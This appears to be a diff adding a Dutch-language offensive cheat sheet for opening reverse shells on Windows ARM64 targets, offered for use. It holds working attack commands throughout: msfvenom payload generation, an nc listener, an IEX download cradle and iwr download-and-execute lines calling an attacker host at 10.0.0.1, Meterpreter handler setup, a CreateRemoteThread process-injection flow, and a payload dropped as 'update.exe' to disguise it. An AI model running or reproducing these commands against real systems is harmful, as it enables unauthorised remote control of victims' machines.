@@ -1,0 +1,77 @@
+# Windows ARM64 Reverse Shell — drie aanpakken
+# Check procesarchitectuur (onderscheidt native ARM64 PS van x64-geëmuleerd):
+[System.Runtime.InteropServices.RuntimeInformation]::ProcessArchitecture
+# Arm64 = native ARM64 PowerShell → opties 1 of 2
+# X64   = x64 geëmuleerde PowerShell → optie 3 werkt ook direct
+
+# ─────────────────────────────────────────────────────────────────────
+# OPTIE 1 — Pure PowerShell reverse shell (geen shellcode, arch-onafhankelijk)
+# ─────────────────────────────────────────────────────────────────────
+# Genereer (op aanvaller):
+msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=10.0.0.1 LPORT=443 -f raw -o http/payloads/shell_ps_443.ps1
+
+# Listener (plain TCP, geen TLS):
+nc -lnvp 443
+
+# Downloaden + uitvoeren op doelwit (werkt in elke PS, elke arch):
+iwr -Uri 'http://10.0.0.1/payloads/shell_ps_443.ps1' -OutFile 'c:\windows\tasks\shell.ps1' -TimeoutSec 300; c:\windows\tasks\shell.ps1
+
+# Of via cradle (geen bestand op schijf):
+IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/payloads/shell_ps_443.ps1')
+
+# ─────────────────────────────────────────────────────────────────────
+# OPTIE 2 — x64 shellcode via x64 processinjectie (op ARM64 Windows)
+# ─────────────────────────────────────────────────────────────────────
+# Vereiste: inject x64 shellcode in een x64 (geëmuleerd) hostproces
+# ARM64 Windows 11 draait x64 binaries transparant via emulatie
+
+# Stap 1: Genereer x64 shellcode (op aanvaller):
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f exe -o http/payloads/meth_https_443.exe
+
+# Metasploit handler:
+# use exploit/multi/handler
+# set payload windows/x64/meterpreter/reverse_https
+# set LHOST 10.0.0.1 / set LPORT 443
+# run -j
+
+# Stap 2: Vind een x64 hostproces op het ARM64 doelwit:
+Get-Process | Where-Object { $_.Path -and (Test-Path $_.Path) } | Select-Object Id, ProcessName, Path | Format-Table -AutoSize
+# WerFault.exe, RuntimeBroker.exe, svchost.exe zijn vaak x64 (geëmuleerd)
+
+# Of start zelf een x64 hostproces:
+$hostproc = Start-Process -FilePath 'C:\Windows\System32\WerFault.exe' -PassThru
+
+# Stap 3: Injecteer x64 shellcode via CreateRemoteThread (zie inject_createremotethread):
+# Gebruik $hostproc.Id als doelwit-PID
+# Flow: OpenProcess → VirtualAllocEx(MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+#        → WriteProcessMemory(shellcode) → CreateRemoteThread
+# Zie: http://10.0.0.1/commands/inject_createremotethread
+
+# Stap 4: Alternatief — start x64 PowerShell via emulatie voor directe injectie:
+# Op ARM64 Windows bestaat geen aparte x64 PS map, maar je kunt x64 cmd starten
+# en daarvandaan x64 shellcode uitvoeren als eigen proces (zie optie 3)
+
+# ─────────────────────────────────────────────────────────────────────
+# OPTIE 3 — x64 .exe direct (werkt via ARM64 Windows x64 emulatie)
+# ─────────────────────────────────────────────────────────────────────
+# Genereer (op aanvaller):
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f exe -o http/payloads/meth_https_443.exe
+
+# Downloaden + uitvoeren op ARM64 doelwit:
+iwr -Uri 'http://10.0.0.1/payloads/meth_https_443.exe' -OutFile 'c:\windows\tasks\update.exe' -TimeoutSec 300
+Start-Process 'c:\windows\tasks\update.exe'
+# ARM64 Windows 11 start het x64 exe via emulatie — verbinding komt binnen op de MSF handler
+
+# Metasploit handler:
+# use exploit/multi/handler
+# set payload windows/x64/meterpreter/reverse_https
+# set LHOST 10.0.0.1 / set LPORT 443
+# run -j
+
+# ─────────────────────────────────────────────────────────────────────
+# KEUZE SCHEMA
+# ─────────────────────────────────────────────────────────────────────
+# ProcessArchitecture = Arm64 + wil geen exe droppen  → Optie 1 (pure PS)
+# ProcessArchitecture = Arm64 + wil Meterpreter shell → Optie 2 (inject in x64 proces)
+# Wil gewoon Meterpreter, .exe toegestaan            → Optie 3 (x64 exe via emulatie)
+# ProcessArchitecture = X64 (al geëmuleerd)          → Gebruik reguliere x64 aanpak
